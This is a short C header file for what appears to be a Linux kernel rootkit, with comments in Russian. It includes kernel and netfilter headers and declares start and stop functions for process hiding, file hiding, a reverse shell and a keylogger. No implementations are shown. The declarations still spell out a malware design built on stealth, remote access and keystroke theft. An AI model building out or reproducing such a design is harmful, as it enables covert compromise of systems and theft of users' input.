/*
 * headers.h
 *
 * Подключаемые заголовочные файлы
 *
 */

#include <linux/init.h>
#include <linux/string.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include "linux/ctype.h"
#include "example_config.h"
#include <linux/ip.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/skbuff.h>
#include <linux/udp.h>
#include <linux/kmod.h>
#include <linux/preempt.h>

//Интерфейсные функции модулей руткита

int start_rootkit_proc_hide (void);
int stop_rootkit_proc_hide (void);

int start_rootkit_file_hide(void);
int stop_rootkit_file_hide(void);

int start_reverse_shell_rootkit(void);
int stop_reverse_shell_rootkit(void);

int init_fops(void);
void exit_fops(void);

int run_keylogger(void);
void stop_keylogger(void);
